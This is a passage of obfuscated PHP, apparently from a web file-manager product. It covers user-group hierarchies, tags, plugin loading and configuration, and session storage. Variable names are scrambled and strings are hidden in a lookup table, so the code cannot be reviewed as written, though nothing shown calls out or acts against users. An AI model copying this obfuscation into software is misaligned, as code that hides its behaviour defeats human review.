array_to_keyvalue_group($æİéÎ˜ı, $è€§üÌ³[1980]); foreach ($æİéÎ˜ı as &$¶š’‹ñ) { $¶š’‹ñ = array_to_keyvalue($¶š’‹ñ, $è€§üÌ³[97], $è€§üÌ³[450]); } unset($¶š’‹ñ); foreach ($í³¬¦”ü as &$ÉÃšùÒÕ) { $ÉÃšùÒÕ[$è€§üÌ³[539]] = array(); if (isset($æİéÎ˜ı[$ÉÃšùÒÕ[$è€§üÌ³[1980]]])) { $ÉÃšùÒÕ[$è€§üÌ³[539]] = $æİéÎ˜ı[$ÉÃšùÒÕ[$è€§üÌ³[1980]]]; } } unset($ÉÃšùÒÕ); } protected function parentLevelArray($¾ßÇ‚Ê) { $şÛÊÍ‚ =& $_SERVER[²Ö÷öõ]; $¾ßÇ‚Ê = explode($şÛÊÍ‚[50], trim($¾ßÇ‚Ê, $şÛÊÍ‚[50])); $¾ßÇ‚Ê = array_remove_value($¾ßÇ‚Ê, $şÛÊÍ‚[228]); return $¾ßÇ‚Ê; } protected function parentInGroup($ñü²º¼Ú, $˜ş¿Ÿ¾¦) { $éĞÜ×ñµ =& $_SERVER[²Ö÷öõ]; $Á«¤ù´„ = $this->getInfoSimple($ñü²º¼Ú); if (!$Á«¤ù´„) { return !0; } $ÒóĞÔÈˆ = $this->parentLevelArray($Á«¤ù´„[$éĞÜ×ñµ[584]]); $ÒóĞÔÈˆ[] = $ñü²º¼Ú; foreach ($ÒóĞÔÈˆ as $ñü²º¼Ú) { if (in_array($ñü²º¼Ú . $éĞÜ×ñµ[12], $˜ş¿Ÿ¾¦)) { return !0; } } return !1; } private function _listAppendParent(&$“âµ¾è”) { $Ù½Æ–¦° =& $_SERVER[²Ö÷öõ]; $çöîÆ¹ = array(); foreach ($“âµ¾è” as &$‰¶›‡™Á) { $çöîÆ¹[$‰¶›‡™Á[$Ù½Æ–¦°[1980]]] = $‰¶›‡™Á[$Ù½Æ–¦°[32]]; $’äÜõî = $this->parentLevelArray($‰¶›‡™Á[$Ù½Æ–¦°[584]]); foreach ($’äÜõî as $ò‡Ãû†Ø) { if (!isset($çöîÆ¹[$ò‡Ãû†Ø])) { $çöîÆ¹[$ò‡Ãû†Ø] = 0; } } } unset($‰¶›‡™Á); foreach ($çöîÆ¹ as $Ÿ£è™ò => $Ñ°Àİ¼¶) { if ($Ñ°Àİ¼¶) { continue; } $ññĞ †  = $this->getInfoSimple($Ÿ£è™ò); $çöîÆ¹[$Ÿ£è™ò] = $ññĞ † [$Ù½Æ–¦°[32]]; } $“Ç×Šáç = $GLOBALS[$Ù½Æ–¦°[6]][$Ù½Æ–¦°[92]][$Ù½Æ–¦°[2087]]; if (KodUser::isRoot()) { $“Ç×Šáç = !1; } foreach ($“âµ¾è” as &$‰¶›‡™Á) { $’äÜõî = $this->parentLevelArray($‰¶›‡™Á[$Ù½Æ–¦°[584]]); $Ë¨Äëí· = $Ù½Æ–¦°[12]; foreach ($’äÜõî as $Ÿ£è™ò => $ò‡Ãû†Ø) { if ($“Ç×Šáç && $Ÿ£è™ò == 0) { continue; } $Ë¨Äëí· .= $çöîÆ¹[$ò‡Ãû†Ø] . $Ù½Æ–¦°[8]; } if ($’äÜõî) { $Ë¨Äëí· .= $‰¶›‡™Á[$Ù½Æ–¦°[32]]; } $‰¶›‡™Á[$Ù½Æ–¦°[589]] = str_replace($Ù½Æ–¦°[592], $Ù½Æ–¦°[8], $Ë¨Äëí·); } unset($‰¶›‡™Á); } private function _listAppendSourceRoot(&$îè„†§, $¶§ı¢Ã) { $üßøÏâ® =& $_SERVER[²Ö÷öõ]; $‰ŸÂ—Ã = Model($üßøÏâ®[907])->listSourceRoot(SourceModel::TYPE_GROUP, $¶§ı¢Ã); $‰ŸÂ—Ã = array_to_keyvalue($‰ŸÂ—Ã, $üßøÏâ®[569]); $‰ŸÂ—Ã = array_remove_key($‰ŸÂ—Ã, $üßøÏâ®[569]); foreach ($îè„†§ as &$âÒÛ‹Ú’) { $âÒÛ‹Ú’[$üßøÏâ®[90]] = $‰ŸÂ—Ã[$âÒÛ‹Ú’[$üßøÏâ®[1980]]] ? $‰ŸÂ—Ã[$âÒÛ‹Ú’[$üßøÏâ®[1980]]] : array(); } unset($âÒÛ‹Ú’); } protected function groupMerge($šì–³ÚÌ) { $šì–³ÚÌ = array_values(array_unique($šì–³ÚÌ)); $Û¯ëÈ‹Â = array(); for ($Ù¯«ÖØˆ = 0; $Ù¯«ÖØˆ < count($šì–³ÚÌ); $Ù¯«ÖØˆ++) { $¯©şÇŒ™ = !1; for ($™‹ñÓ¤ù = 0; $™‹ñÓ¤ù < count($šì–³ÚÌ); $™‹ñÓ¤ù++) { if ($Ù¯«ÖØˆ == $™‹ñÓ¤ù) { continue; } if ($this->isParentOf($šì–³ÚÌ[$™‹ñÓ¤ù], $šì–³ÚÌ[$Ù¯«ÖØˆ])) { $¯©şÇŒ™ = !0; break; } } if (!$¯©şÇŒ™) { $Û¯ëÈ‹Â[] = $šì–³ÚÌ[$Ù¯«ÖØˆ]; } } return $Û¯ëÈ‹Â; } protected function isParentOf($˜³ë›ªÆ, $ù²±çóè) { $œà†§µ =& $_SERVER[²Ö÷öõ]; if (!$˜³ë›ªÆ || !$ù²±çóè || $˜³ë›ªÆ == $ù²±çóè) { return !1; } $•õèØà = $this->getInfoSimple($˜³ë›ªÆ); $÷‚Ä£ÆÑ = $this->getInfoSimple($ù²±çóè); $£‘„¼èø = $•õèØà[$œà†§µ[584]] . $˜³ë›ªÆ . $œà†§µ[50]; if (substr($÷‚Ä£ÆÑ[$œà†§µ[584]], 0, strlen($£‘„¼èø)) == $£‘„¼èø) { return !0; } return !1; } public function groupShowRoot($›¶ó£‡™, $¬ùÓ´© = false) { $®ñõÀ“ =& $_SERVER[²Ö÷öõ]; $¯Îˆ ¡ = $this->getInfo($›¶ó£‡™); if (!$¯Îˆ ¡) { return array(); } $Ş…œËøÃ = $this->parentLevelArray($¯Îˆ ¡[$®ñõÀ“[584]]); $ß„³ù‰ù = array($›¶ó£‡™); if (count($Ş…œËøÃ) == 0) { return $ß„³ù‰ù; } if ($¬ùÓ´© && count($Ş…œËøÃ) == 1) { return $ß„³ù‰ù; } if (!$¯Îˆ ¡[$®ñõÀ“[539]] || !isset($¯Îˆ ¡[$®ñõÀ“[539]][$®ñõÀ“[2070]]) || $¯Îˆ ¡[$®ñõÀ“[539]][$®ñõÀ“[2070]] == $®ñõÀ“[859]) { return $this->groupShowRoot($Ş…œËøÃ[count($Ş…œËøÃ) - 1], $¬ùÓ´©); } if ($¯Îˆ ¡[$®ñõÀ“[539]][$®ñõÀ“[2070]] == $®ñõÀ“[433]) { $“Å’¥´‚ = explode($®ñõÀ“[50], $¯Îˆ ¡[$®ñõÀ“[539]][$®ñõÀ“[2071]]); if ($“Å’¥´‚) { $ß„³ù‰ù = array_merge($ß„³ù‰ù, $“Å’¥´‚); } } return $ß„³ù‰ù; } protected function resetParentLevel() { $Âƒµáò« =& $_SERVER[²Ö÷öõ]; $¤Ãà¸Íá = $Âƒµáò«[1980]; $ÀÙÏÌ›› = $this->select(); $ÀÙÏÌ›› = array_to_keyvalue($ÀÙÏÌ››, $¤Ãà¸Íá); foreach ($ÀÙÏÌ›› as $ĞÇî‰ºõ) { $™ÙÛîüÙ = $ĞÇî‰ºõ; $ÕğôÇ´Û = array(); while ($™ÙÛîüÙ[$Âƒµáò«[192]] != 0) { $ÕğôÇ´Û[] = $™ÙÛîüÙ[$Âƒµáò«[192]]; $™ÙÛîüÙ = $ÀÙÏÌ››[$™ÙÛîüÙ[$Âƒµáò«[192]]]; } $ÕğôÇ´Û[] = 0; $ÕğôÇ´Û = $Âƒµáò«[50] . implode($Âƒµáò«[50], array_reverse($ÕğôÇ´Û)) . $Âƒµáò«[50]; $this->setNamePinyin($ĞÇî‰ºõ[$¤Ãà¸Íá], $ĞÇî‰ºõ[$Âƒµáò«[32]]); $this->where(array($¤Ãà¸Íá => $ĞÇî‰ºõ[$¤Ãà¸Íá]))->save(array($Âƒµáò«[652] => $ÕğôÇ´Û)); } return $ÀÙÏÌ››; } public function groupNameAuto($âÂÈÛîï, $íÓ¥—ò¸) { $ƒšÎÍùè =& $_SERVER[²Ö÷öõ]; $êÏÅÊş = $this->where(array($ƒšÎÍùè[477] => $âÂÈÛîï))->getField($ƒšÎÍùè[32], !0); if (!$êÏÅÊş || !in_array($íÓ¥—ò¸, $êÏÅÊş)) { return $íÓ¥—ò¸; } for ($Ñ¶®şû¥ = 1; $Ñ¶®şû¥ <= count($êÏÅÊş) + 1; $Ñ¶®şû¥++) { $â–‰Ö›á = $íÓ¥—ò¸ . "\x28{$Ñ¶®şû¥}\x29"; if (!in_array($â–‰Ö›á, $êÏÅÊş)) { return $â–‰Ö›á; } } } public function groupSwitch($ïÆÑÇÄÇ, $˜­³£) { $µà®ÀÑ¡ =& $_SERVER[²Ö÷öõ]; $ØşŠÃÎî = array($µà®ÀÑ¡[1980] => array($µà®ÀÑ¡[7], array($ïÆÑÇÄÇ, $˜­³£))); $‚½µ¸ÒÜ = $this->where($ØşŠÃÎî)->select(); $‚½µ¸ÒÜ = array_to_keyvalue($‚½µ¸ÒÜ, $µà®ÀÑ¡[1980]); if (!isset($‚½µ¸ÒÜ[$ïÆÑÇÄÇ]) || !isset($‚½µ¸ÒÜ[$˜­³£]) || $‚½µ¸ÒÜ[$ïÆÑÇÄÇ][$µà®ÀÑ¡[192]] == 0) { return !1; } $ØşŠÃÎî = array($µà®ÀÑ¡[1980] => $ïÆÑÇÄÇ); $ğ±Å®­Ğ = Model($µà®ÀÑ¡[2074])->where($ØşŠÃÎî)->select(); if (!$ğ±Å®­Ğ) { $ğ±Å®­Ğ = array(); } foreach ($ğ±Å®­Ğ as $çë‰ù¿À) { $’×Ğ­¬ = $çë‰ù¿À[$µà®ÀÑ¡[1780]]; $ØşŠÃÎî = array($µà®ÀÑ¡[1780] => $’×Ğ­¬, $µà®ÀÑ¡[1980] => $˜­³£); $ı›Á¢ÌŞ = Model($µà®ÀÑ¡[2074])->where($ØşŠÃÎî)->find(); if (!$ı›Á¢ÌŞ) { $®’ÓÁëé = array($˜­³£ => $çë‰ù¿À[$µà®ÀÑ¡[2088]]); Model($µà®ÀÑ¡[598])->userGroupAdd($’×Ğ­¬, $®’ÓÁëé); } Model($µà®ÀÑ¡[598])->userGroupRemove($’×Ğ­¬, $ïÆÑÇÄÇ); } $ØşŠÃÎî = array($µà®ÀÑ¡[190] => 2, $µà®ÀÑ¡[192] => 0, $µà®ÀÑ¡[485] => 1, $µà®ÀÑ¡[569] => array($µà®ÀÑ¡[7], array($ïÆÑÇÄÇ, $˜­³£))); $´¤Ç’šÂ = Model($µà®ÀÑ¡[907])->where($ØşŠÃÎî)->field($µà®ÀÑ¡[2089])->select(); $´¤Ç’šÂ = array_to_keyvalue($´¤Ç’šÂ, $µà®ÀÑ¡[569], $µà®ÀÑ¡[193]); $ëã·§‚ = !empty($´¤Ç’šÂ[$ïÆÑÇÄÇ]) ? $´¤Ç’šÂ[$ïÆÑÇÄÇ] : !1; if ($ëã·§‚) { if (!$´¤Ç’šÂ[$˜­³£]) { $´¤Ç’šÂ[$˜­³£] = Model($µà®ÀÑ¡[907])->groupRootAdd($˜­³£); } $ŞÖû’ôá = $´¤Ç’šÂ[$˜­³£]; $ØşŠÃÎî = array($µà®ÀÑ¡[192] => $ëã·§‚); $´¤Ç’šÂ = Model($µà®ÀÑ¡[907])->where($ØşŠÃÎî)->field($µà®ÀÑ¡[2090])->select(); if (!$´¤Ç’šÂ) { $´¤Ç’šÂ = array(); } Model($µà®ÀÑ¡[907])->moveClearAuth = !1; foreach ($´¤Ç’šÂ as $‰Ñ„ºõù) { $µÓÔ©âË = $‰Ñ„ºõù[$µà®ÀÑ¡[485]] == $µà®ÀÑ¡[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($µà®ÀÑ¡[907])->move($‰Ñ„ºõù[$µà®ÀÑ¡[193]], $ŞÖû’ôá, $µÓÔ©âË); } Model($µà®ÀÑ¡[907])->moveClearAuth = !0; $ØşŠÃÎî = array($µà®ÀÑ¡[190] => 2, $µà®ÀÑ¡[569] => $ïÆÑÇÄÇ); $œõİ»Öé = array($µà®ÀÑ¡[569] => $˜­³£); Model($µà®ÀÑ¡[2091])->where($ØşŠÃÎî)->save($œõİ»Öé); Model($µà®ÀÑ¡[2092])->where($ØşŠÃÎî)->save($œõİ»Öé); } $this->_changeChildLevel($‚½µ¸ÒÜ[$ïÆÑÇÄÇ], $‚½µ¸ÒÜ[$˜­³£], !0); $this->where(array($µà®ÀÑ¡[192] => $ïÆÑÇÄÇ))->save(array($µà®ÀÑ¡[192] => $˜­³£)); $this->_clearChildrenCache($‚½µ¸ÒÜ[$˜­³£]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($¹›é¤›ò) { $çŠõ‚±Â =& $_SERVER[²Ö÷öõ]; return array($çŠõ‚±Â[2093] => array($¹›é¤›ò[0], $çŠõ‚±Â[2094]), $çŠõ‚±Â[2095] => array($¹›é¤›ò[0], $çŠõ‚±Â[2096])); } protected function get($ßµÔÆí) { $è¯å›ì =& $_SERVER[²Ö÷öõ]; $ÍÀ…ÄÈ = Model($è¯å›ì[585])->metaGet($ßµÔÆí, $è¯å›ì[2097]); $ˆ÷î˜˜Ë = json_decode($ÍÀ…ÄÈ, !0); return $ˆ÷î˜˜Ë ? $ˆ÷î˜˜Ë : array($è¯å›ì[2098] => $è¯å›ì[91], $è¯å›ì[445] => array()); } protected function set($áÉ…óÙ, $ğ÷¾ù†¡) { $“Ÿ¤ŒŠª =& $_SERVER[²Ö÷öõ]; $ğ÷¾ù†¡ = $ğ÷¾ù†¡ ? $ğ÷¾ù†¡ : array($“Ÿ¤ŒŠª[2098] => $“Ÿ¤ŒŠª[91], $“Ÿ¤ŒŠª[445] => array()); return Model($“Ÿ¤ŒŠª[585])->metaSet($áÉ…óÙ, $“Ÿ¤ŒŠª[2097], json_encode($ğ÷¾ù†¡)); } protected function getByTagID($§©àñâ, $ ¾Ï·¹) { $ØÊĞÓ£Š =& $_SERVER[²Ö÷öõ]; if (!$§©àñâ || !$ ¾Ï·¹) { return !1; } if (!Model($ØÊĞÓ£Š[585])->getInfoSimple($§©àñâ)) { return !1; } $ŒÒÃ‚ó† = $this->get($§©àñâ); if (!$ŒÒÃ‚ó† || !isset($ŒÒÃ‚ó†[$ØÊĞÓ£Š[445]])) { return !1; } $¨ª¿ÇıÀ = array_find_by_field($ŒÒÃ‚ó†[$ØÊĞÓ£Š[445]], $ØÊĞÓ£Š[475], $ ¾Ï·¹); return is_array($¨ª¿ÇıÀ) ? $¨ª¿ÇıÀ : !1; } public function listSource($É¸Ú–ÓÑ, $ô–ùÕ¶Ú) { $™òì² =& $_SERVER[²Ö÷öõ]; if ($ô–ùÕ¶Ú && !is_array($ô–ùÕ¶Ú)) { $ô–ùÕ¶Ú = array($ô–ùÕ¶Ú); } $øùöŞ—‹ = $this->listData($É¸Ú–ÓÑ); $€º ø— = array(); foreach ($øùöŞ—‹ as $åñäñ) { $´ö”½¿« = $åñäñ[$™òì²[87]]; if (!$´ö”½¿«) { continue; } if (!isset($€º ø—[$´ö”½¿«])) { $€º ø—[$´ö”½¿«] = array(); } $€º ø—[$´ö”½¿«][] = $åñäñ[$™òì²[500]]; } $§„¬Œì = array(); foreach ($€º ø— as $ì™Ç¤õ => $†Ã¶Í³Æ) { $•Ğ”Éš = !0; if (!$ô–ùÕ¶Ú) { $§„¬Œì[] = $ì™Ç¤õ; continue; } foreach ($ô–ùÕ¶Ú as $–èòÈ‚ê) { if (!in_array($–èòÈ‚ê, $†Ã¶Í³Æ)) { $•Ğ”Éš = !1; break; } } if ($•Ğ”Éš) { $§„¬Œì[] = $ì™Ç¤õ; } } if (!$§„¬Œì) { return array(); } $Å©ú”° = array($™òì²[491] => array($™òì²[492], $§„¬Œì), $™òì²[569] => $É¸Ú–ÓÑ, $™òì²[190] => SourceModel::TYPE_GROUP); $—ÀƒÈşß = Model($™òì²[1428])->listSource($Å©ú”°); if (!$—ÀƒÈşß || count($§„¬Œì) == $—ÀƒÈşß[$™òì²[442]][$™òì²[443]]) { return $—ÀƒÈşß; } $á‚ÇşŸŸ = array(); $ãú¦ãìÛ = array_to_keyvalue($—ÀƒÈşß[$™òì²[85]], $™òì²[12], $™òì²[193]); $±ªëÚÙğ = array_to_keyvalue($—ÀƒÈşß[$™òì²[86]], $™òì²[12], $™òì²[193]); $¢ùòØ§ = array_merge($±ªëÚÙğ, $ãú¦ãìÛ); foreach ($§„¬Œì as $´ö”½¿«) { if (!in_array($´ö”½¿«, $¢ùòØ§)) { $á‚ÇşŸŸ[] = $´ö”½¿«; } } if ($á‚ÇşŸŸ) { $this->removeBySource($É¸Ú–ÓÑ, $á‚ÇşŸŸ); } return $—ÀƒÈşß; } protected function listData($–ç”¤‡—) { $ûßÕÇ–ç =& $_SERVER[²Ö÷öõ]; $Àªõ¦£ = array($ûßÕÇ–ç[1771] => 0, $ûßÕÇ–ç[557] => array($ûßÕÇ–ç[2099], 0), $ûßÕÇ–ç[496] => $ûßÕÇ–ç[2100] . $–ç”¤‡—); $µİ×æ±¦ = $ûßÕÇ–ç[2101]; $Öì¥¹¬Ä = $this->field($µİ×æ±¦)->where($Àªõ¦£)->order($ûßÕÇ–ç[2102])->select(); return $Öì¥¹¬Ä ? $Öì¥¹¬Ä : array(); } protected function addToTag($©ã¶ë†Å, $…´ºÈ¡, $Ş¢İÃô²) { $ç ùå¬ =& $_SERVER[²Ö÷öõ]; if (!$this->getByTagID($©ã¶ë†Å, $Ş¢İÃô²) || !$…´ºÈ¡) { return !1; } if (!Model($ç ùå¬[907])->pathInfo($…´ºÈ¡)) { return !1; } $ÄïŞÌÏÀ = array($ç ùå¬[1771] => 0, $ç ùå¬[557] => $Ş¢İÃô², $ç ùå¬[495] => $…´ºÈ¡, $ç ùå¬[496] => $ç ùå¬[2103] . $©ã¶ë†Å, $ç ùå¬[494] => $ç ùå¬[12], $ç ùå¬[1984] => 0); if ($this->where($ÄïŞÌÏÀ)->find()) { return !1; } return $this->add($ÄïŞÌÏÀ); } protected function removeFromTag($­¼ğ‹’Ö, $İÒ¢Šã, $¢ŒÊĞ¡æ) { $ò§¶ØÙò =& $_SERVER[²Ö÷öõ]; if (!$this->getByTagID($­¼ğ‹’Ö, $¢ŒÊĞ¡æ) || !$İÒ¢Šã) { return !1; } if (is_array($İÒ¢Šã)) { $İÒ¢Šã = array($ò§¶ØÙò[7], $İÒ¢Šã); } $ŸÃĞŠ£¢ = array($ò§¶ØÙò[1771] => 0, $ò§¶ØÙò[557] => $¢ŒÊĞ¡æ, $ò§¶ØÙò[496] => $ò§¶ØÙò[2103] . $­¼ğ‹’Ö, $ò§¶ØÙò[495] => $İÒ¢Šã); return $this->where($ŸÃĞŠ£¢)->delete(); } protected function removeByTag($²¾•é¼õ, $İÃÃÍú) { $ıû¢í°§ =& $_SERVER[²Ö÷öõ]; if (!$this->getByTagID($²¾•é¼õ, $İÃÃÍú)) { return !1; } $†÷ŞÄŞ = array($ıû¢í°§[1771] => 0, $ıû¢í°§[557] => $İÃÃÍú, $ıû¢í°§[496] => $ıû¢í°§[2103] . $²¾•é¼õ); return $this->where($†÷ŞÄŞ)->delete(); } protected function removeBySource($àê½‰Ôã, $÷ªº®´) { $©ÎØÍÊÅ =& $_SERVER[²Ö÷öõ]; if (!$àê½‰Ôã || !$÷ªº®´) { return !1; } if (is_array($÷ªº®´)) { $÷ªº®´ = array($©ÎØÍÊÅ[7], $÷ªº®´); } $ÊÙÎØ¤Ë = array($©ÎØÍÊÅ[1771] => 0, $©ÎØÍÊÅ[495] => $÷ªº®´, $©ÎØÍÊÅ[557] => array($©ÎØÍÊÅ[1100], 0), $©ÎØÍÊÅ[496] => $©ÎØÍÊÅ[2103] . $àê½‰Ôã); return $this->where($ÊÙÎØ¤Ë)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\160\x6c\165\x67\x69\156\114\151\163\164"; public $field = array("\156\x61\x6d\145", "\x73\x74\141\x74\x75\x73", "\x72\x65\x67\151\145\163\164", "\x63\x6f\156\146\x69\147"); public function loadList($É­¢Ë±à = false) { $„øé¬Ğ© = array_to_keyvalue($this->listData(), $_SERVER[²Ö÷öõ][32]); if ($É­¢Ë±à) { return $„øé¬Ğ©[$É­¢Ë±à]; } return $„øé¬Ğ©; } public function init() { $Šë„Î‚ñ =& $_SERVER[²Ö÷öõ]; Hook::trigger($Šë„Î‚ñ[2104]); $éÀçÅó» = $this->loadPluginList(); foreach ($éÀçÅó» as $ßÌÁÒØ¦ => $Ø´½Œµ£) { $ˆĞªò÷Ü = $this->appAllow($ßÌÁÒØ¦, $Ø´½Œµ£); if (!$ˆĞªò÷Ü) { continue; } foreach ($Ø´½Œµ£[$Šë„Î‚ñ[2105]] as $·ÍÄÂî => $ŸÅÖ°íÀ) { Hook::bind($·ÍÄÂî, $ŸÅÖ°íÀ); } } Hook::trigger($Šë„Î‚ñ[2106]); Hook::trigger(ACTION); } public function appAllow($‚µÊù¯Ì, $æô—¦¶, $±ŠÀÊ«¼ = true) { $£ùó¿ªÎ =& $_SERVER[²Ö÷öõ]; $ƒğÅ‡Ş£ = PLUGIN_DIR . $‚µÊù¯Ì . $£ùó¿ªÎ[2107]; if (!is_array($æô—¦¶) || !is_array($æô—¦¶[$£ùó¿ªÎ[2105]]) || $æô—¦¶[$£ùó¿ªÎ[833]] != 1 || !is_file($ƒğÅ‡Ş£)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$£ùó¿ªÎ[6]][$£ùó¿ªÎ[2108]] || !$GLOBALS[$£ùó¿ªÎ[6]][$£ùó¿ªÎ[2109]]) { return !0; } $¦¥—ç¬™ = explode($£ùó¿ªÎ[50], strtolower($GLOBALS[$£ùó¿ªÎ[6]][$£ùó¿ªÎ[2109]])); return in_array(strtolower($‚µÊù¯Ì), $¦¥—ç¬™) ? !1 : !0; } if ($±ŠÀÊ«¼ && !Action($£ùó¿ªÎ[2110])->checkAuth($‚µÊù¯Ì)) { return !1; } return !0; } public function unInstall($¬øÖ§ˆÑ) { $è€»¢ŞŸ =& $_SERVER[²Ö÷öõ]; $ÈéŸ°¨é = $this->loadList($¬øÖ§ˆÑ); if (file_exists(PLUGIN_DIR . $¬øÖ§ˆÑ)) { Hook::apply($¬øÖ§ˆÑ . $è€»¢ŞŸ[2111]); } $this->remove($ÈéŸ°¨é[$è€»¢ŞŸ[475]]); } public function changeStatus($§‘Û‚´, $êÙ¬÷) { $ÙúÃ =& $_SERVER[²Ö÷öõ]; $‘ş‰çë = $this->loadList($§‘Û‚´); if ($êÙ¬÷) { Hook::apply($§‘Û‚´ . $ÙúÃ[2112]); } $this->update($‘ş‰çë[$ÙúÃ[475]], array($ÙúÃ[2113] => $êÙ¬÷)); } public function appRegist($ÒÃÅÏÃó, $ÅúÃîÇá) { $Ù¶ó´ìì =& $_SERVER[²Ö÷öõ]; $ûÀŞÒ®ë = $this->loadList($ÒÃÅÏÃó); if ($ûÀŞÒ®ë) { $this->update($ûÀŞÒ®ë[$Ù¶ó´ìì[475]], array($Ù¶ó´ìì[2105] => $ÅúÃîÇá)); } else { $ŞÀ»à£ = array($Ù¶ó´ìì[32] => $ÒÃÅÏÃó, $Ù¶ó´ìì[2105] => $ÅúÃîÇá, $Ù¶ó´ìì[833] => 0, $Ù¶ó´ìì[6] => $this->getConfigDefault($ÒÃÅÏÃó)); $this->insert($ŞÀ»à£); } } public function getConfigDefault($ŞÅ©Ö™) { $ï‚¿•ı° =& $_SERVER[²Ö÷öõ]; $•Š¡ê = array(); $²´´ŒªÒ = $this->getPackageJson($ŞÅ©Ö™); if (!$²´´ŒªÒ && is_array($²´´ŒªÒ[$ï‚¿•ı°[2114]])) { return $•Š¡ê; } foreach ($²´´ŒªÒ[$ï‚¿•ı°[2114]] as $¨ùñÄ—¶ => $ü¡ì·É) { if (!isset($ü¡ì·É[$ï‚¿•ı°[450]]) || isset($•Š¡ê[$¨ùñÄ—¶])) { continue; } $•Š¡ê[$¨ùñÄ—¶] = $ü¡ì·É[$ï‚¿•ı°[450]]; } return $•Š¡ê; } public function getPackageJson($µÃ‡‚íù) { return Hook::apply($µÃ‡‚íù . $_SERVER[²Ö÷öõ][2115]); } public function getConfig($ûê£™òó, $¢‡ÂéË“ = false) { $€Ù‹æ÷„ =& $_SERVER[²Ö÷öõ]; $Ñ’­â¿ƒ = array(); $¶Àµ»ï¨ = $this->loadList($ûê£™òó); if ($¶Àµ»ï¨ && is_array($¶Àµ»ï¨[$€Ù‹æ÷„[6]])) { $Ñ’­â¿ƒ = $¶Àµ»ï¨[$€Ù‹æ÷„[6]]; } if (!$Ñ’­â¿ƒ || $¢‡ÂéË“) { $Ñ’­â¿ƒ = $this->getConfigDefault($ûê£™òó); } return $Ñ’­â¿ƒ; } public function setConfig($…†Ó–ƒç, $§ü£õéÙ = false) { $µ«²ù†€ =& $_SERVER[²Ö÷öõ]; $ı÷—à” = $this->loadList($…†Ó–ƒç); if (!$ı÷—à”) { return !1; } $ÉÙÅ¸™° = $ı÷—à”[$µ«²ù†€[6]]; if ($§ü£õéÙ == !1) { $ÉÙÅ¸™° = array(); $§ü£õéÙ = $this->getConfigDefault($…†Ó–ƒç); } foreach ($§ü£õéÙ as $à×ìÅùò => $®»Üšë) { $ÉÙÅ¸™°[$à×ìÅùò] = is_string($®»Üšë) ? trim($®»Üšë) : $®»Üšë; } $this->update($ı÷—à”[$µ«²ù†€[475]], array($µ«²ù†€[6] => $ÉÙÅ¸™°)); } public function viewList() { $Ç””Ì‡« =& $_SERVER[²Ö÷öõ]; $ˆõ‰ú© = $this->loadList(); $this->pluginScan($ˆõ‰ú©); $ˆõ‰ú© = $this->loadPluginList(); $¢àä·Š = array(); foreach ($ˆõ‰ú© as $‡Ú«±¦ => $§ê¦­’Ø) { $®¹Õ“æå = $§ê¦­’Ø; unset($§ê¦­’Ø[$Ç””Ì‡«[2105]], $§ê¦­’Ø[$Ç””Ì‡«[6]]); $¡µÆó»€ = PLUGIN_DIR . $§ê¦­’Ø[$Ç””Ì‡«[32]] . $Ç””Ì‡«[2107]; if (!is_file($¡µÆó»€)) { continue; } $§î²Î× = Hook::apply($§ê¦­’Ø[$Ç””Ì‡«[32]] . $Ç””Ì‡«[2115]); if (!is_array($§î²Î×)) { continue; } $¢àä·Š[$‡Ú«±¦] = array_merge($§ê¦­’Ø, $§î²Î×); if ($®¹Õ“æå[$Ç””Ì‡«[6]][$Ç””Ì‡«[1692]] != $§î²Î×[$Ç””Ì‡«[1666]]) { Hook::apply($§ê¦­’Ø[$Ç””Ì‡«[32]] . $Ç””Ì‡«[2112]); $®¹Õ“æå[$Ç””Ì‡«[6]][$Ç””Ì‡«[1692]] = $§î²Î×[$Ç””Ì‡«[1666]]; $this->update($§ê¦­’Ø[$Ç””Ì‡«[475]], array($Ç””Ì‡«[6] => $®¹Õ“æå[$Ç””Ì‡«[6]])); } } return $¢àä·Š; } private function loadPluginList() { $ëÆû…Õß =& $_SERVER[²Ö÷öõ]; $÷ç½˜úÚ = $this->loadList(); if (strtolower(MOD) == $ëÆû…Õß[2116]) { return $÷ç½˜úÚ; } $õåüãè = Hook::trigger($ëÆû…Õß[2117], $÷ç½˜úÚ); if ($÷ç½˜úÚ && !$õåüãè) { die; } return $õåüãè ? $õåüãè : $÷ç½˜úÚ; } private function pluginScan($¨üş¬áÓ) { $Ã•ùıªõ =& $_SERVER[²Ö÷öõ]; recursion_dir(PLUGIN_DIR, $ûÃõøé¬, $ñç¨Áëû, 0); foreach ($ûÃõøé¬ as $¸®ŞÅ®Å) { $€Ë‡¼Æ¬ = get_path_this($¸®ŞÅ®Å); if (isset($¨üş¬áÓ[$€Ë‡¼Æ¬]) || !file_exists($¸®ŞÅ®Å . $Ã•ùıªõ[2118]) || !file_exists($¸®ŞÅ®Å . $Ã•ùıªõ[2107])) { continue; } Hook::apply($€Ë‡¼Æ¬ . $Ã•ùıªõ[2112]); } } } goto CˆŒÇ‰Á‰¬; CˆŒÇ‰Á‰¬: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\155\137\x73\145\163\x73\x69\x6f\156"; public function get($Àõ¦ï) { $í¾ÏÆÕò =& $_SERVER[²Ö÷öõ]; $ª‰ïŠıú = $this->where(array($í¾ÏÆÕò[2119] => $Àõ¦ï))->find(); if (!is_array($ª‰ïŠıú)) { return !1; } return $ª‰ïŠıú[$í¾ÏÆÕò[171]]; } public function set($çë·Øä×, $ å¡”Ûá, $¶ÀãàÜ¥ = 3600) { $ø İŠ„û =& $_SERVER[²Ö÷öõ]; $Ç–ËÉ³„ = array($ø İŠ„û[2119] => $çë·Øä×, $ø İŠ„û[2019] => $ å¡”Ûá, $ø İŠ„û[2120] => $¶ÀãàÜ¥ + time()); if (Session::get($ø İŠ„û[2121])) { $Ç–ËÉ³„[$ø İŠ„û[1780]] = Session::get($ø İŠ„û[2121]); } else { $Ç–ËÉ³„[$ø İŠ„û[1780]] = 0; } if ($this->get($çë·Øä×)) { return $this->where(array($ø İŠ„û[2119] => $çë·Øä×))->save($Ç–ËÉ³„); } else { return $this->add($Ç–ËÉ³„, array(), !0); } } public function remove($ıÑëŒ‰ò) { return $this->where(array($_SERVER[²Ö÷öõ][2119] => $ıÑëŒ‰ò))->delete(); } public function clearTimeout() { return $this->where($_SERVER[²Ö÷öõ][2122] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = 